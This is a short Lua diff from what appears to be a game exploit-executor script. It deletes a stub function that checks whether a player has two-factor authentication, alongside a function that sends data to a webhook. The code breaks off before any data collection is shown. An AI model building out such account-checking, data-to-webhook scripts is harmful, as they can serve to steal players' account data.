@@ -183,12 +183,6 @@ local function getExploitName()
     return "Unknown"
 end
 
--- Function to check if the player has 2FA enabled
-local function has2FA()
-    -- Add your implementation here
-    return false
-end
-
 -- Main function to send data to webhook
 local function sendToWebhook(url, data)
     local headers = {
